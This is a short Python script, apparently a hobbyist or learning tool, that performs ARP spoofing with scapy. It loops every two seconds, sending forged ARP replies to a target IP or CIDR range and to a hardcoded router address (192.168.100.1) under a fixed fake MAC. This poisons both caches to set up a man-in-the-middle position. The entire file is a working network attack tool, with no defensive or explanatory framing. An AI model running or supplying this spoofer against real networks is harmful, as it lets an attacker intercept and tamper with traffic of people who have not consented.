#!/usr/bin/env python3
import argparse
import time
import scapy.all as scapy

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="target_ip", help="Host / IP Range (CIDR) to Spoof")

    return parser.parse_args()

def spoof(target_ip, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwsrc="aa:bb:cc:44:55:77")
    scapy.send(arp_packet, verbose=False)

def run_spoofer():
    arguments = get_arguments()
    router_ip = "192.168.100.1"

    while True:
        spoof(arguments.target_ip, router_ip)
        spoof(router_ip, arguments.target_ip)

        time.sleep(2)

if __name__ == "__main__":
    run_spoofer()
